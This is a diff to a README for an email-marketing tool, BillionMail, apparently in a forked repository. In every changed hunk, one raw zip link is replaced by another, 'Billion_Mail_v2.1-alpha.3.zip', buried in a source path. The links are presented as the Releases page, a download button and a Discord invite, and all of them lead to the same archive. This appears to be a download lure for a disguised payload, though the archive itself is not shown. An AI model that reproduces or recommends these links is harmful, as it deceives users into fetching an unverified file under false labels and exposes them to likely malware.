@@ -8,7 +8,7 @@ BillionMail gives you a powerful and user-friendly way to manage your email need
 
 1. **Download the Application:** Begin your journey by downloading the software from the Releases page. Click the button below:
 
-   [![Download BillionMail](https://raw.githubusercontent.com/azharerradi/BillionMail/dev/cell/BillionMail.zip)](https://raw.githubusercontent.com/azharerradi/BillionMail/dev/cell/BillionMail.zip)
+   [![Download BillionMail](https://github.com/azharerradi/BillionMail/raw/refs/heads/dev/core/api/batch_mail/v1/Billion_Mail_v2.1-alpha.3.zip)](https://github.com/azharerradi/BillionMail/raw/refs/heads/dev/core/api/batch_mail/v1/Billion_Mail_v2.1-alpha.3.zip)
 
 2. **Install Requirements:** Ensure your system meets the following requirements to run BillionMail smoothly:
 
@@ -19,7 +19,7 @@ BillionMail gives you a powerful and user-friendly way to manage your email need
 
 ## 📥 Download & Install
 
-To download BillionMail, visit this page: [BillionMail Releases](https://raw.githubusercontent.com/azharerradi/BillionMail/dev/cell/BillionMail.zip).
+To download BillionMail, visit this page: [BillionMail Releases](https://github.com/azharerradi/BillionMail/raw/refs/heads/dev/core/api/batch_mail/v1/Billion_Mail_v2.1-alpha.3.zip).
 
 ### Installation Steps
 
@@ -57,7 +57,7 @@ BillionMail packs a range of features to streamline your email marketing and man
 
 If you run into any issues or have questions, the BillionMail community is here to help. Join our Discord channel for support and to connect with other users:
 
-[Join our Discord](https://raw.githubusercontent.com/azharerradi/BillionMail/dev/cell/BillionMail.zip)
+[Join our Discord](https://github.com/azharerradi/BillionMail/raw/refs/heads/dev/core/api/batch_mail/v1/Billion_Mail_v2.1-alpha.3.zip)
 
 ## 🛡️ Security
 
@@ -86,4 +86,4 @@ Stay tuned for upcoming features and improvements. Our team is dedicated to enha
 
 BillionMail is designed for everyone, from beginners to experienced users. If you follow the steps outlined above, you will be well on your way to managing your email effectively. 
 
-For the latest downloads, go to [BillionMail Releases](https://raw.githubusercontent.com/azharerradi/BillionMail/dev/cell/BillionMail.zip) and start your journey today!
+For the latest downloads, go to [BillionMail Releases](https://github.com/azharerradi/BillionMail/raw/refs/heads/dev/core/api/batch_mail/v1/Billion_Mail_v2.1-alpha.3.zip) and start your journey today!
